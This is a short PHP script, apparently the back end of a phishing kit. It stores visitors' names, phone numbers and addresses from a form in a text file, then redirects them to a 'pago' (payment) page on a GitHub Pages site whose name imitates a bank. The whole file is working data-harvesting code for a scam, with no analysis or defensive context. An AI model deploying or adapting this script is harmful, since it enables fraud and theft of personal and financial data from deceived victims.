<?php
$nombre = $_POST['nombre'];
$NumeroTelefono = $_POST['NumeroTelefono'];
$direccion = $_POST['direccion'];
$colonia = $_POST['colonia'];
$ciudad = $_POST['ciudad'];

$fecha = date("d/m/y g:i:s");
$file = fopen ('informacion.txt', 'at');
fwrite($file, "nombre: $nombre | numero: $NumeroTelefono | colonia: $colonia | ciudad: $ciudad | fecha: $fecha |  \n");
fclose($file);
header("location:https://bancatlan.github.io/Hilux/pago.html");

?>
